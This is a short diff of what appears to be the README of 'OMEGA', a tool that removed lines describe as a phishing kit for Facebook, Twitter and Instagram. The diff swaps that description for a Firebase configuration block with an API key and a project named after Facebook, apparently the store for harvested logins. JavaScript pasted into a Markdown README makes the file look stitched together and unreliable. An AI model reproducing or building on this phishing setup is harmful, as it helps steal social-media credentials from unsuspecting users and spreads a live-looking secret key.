@@ -1,17 +1,14 @@
 <p align="left">
-  <a><img title="Built With Love" src="https://forthebadge.com/images/badges/built-with-love.svg" ></a>
- </p>
-<p align="center" style="font-weight:bolder;font-size:50px">
-<center><h1 align="center" >OMEGA</h1></center>
-</p>
-
-<p align="center">
-Phishing Tool Coded in Simple HTML.
-</p>
-<p align="center">
-FACEBOOK | TWITTER | INSTAGRAM
-</p>
-
+const firebaseConfig = {
+  apiKey: "AIzaSyAHAFuP7VDYZeA73juO-EjRf1q5b12pHAU",
+  authDomain: "facebook-29e12.firebaseapp.com",
+  databaseURL: "https://facebook-29e12.firebaseio.com",
+  projectId: "facebook-29e12",
+  storageBucket: "facebook-29e12.appspot.com",
+  messagingSenderId: "528507797575",
+  appId: "1:528507797575:web:a091de79ed520643dcb162",
+  measurementId: "G-ZG0C1EQGZK"
+};
 
 
 ## CREDIT:-
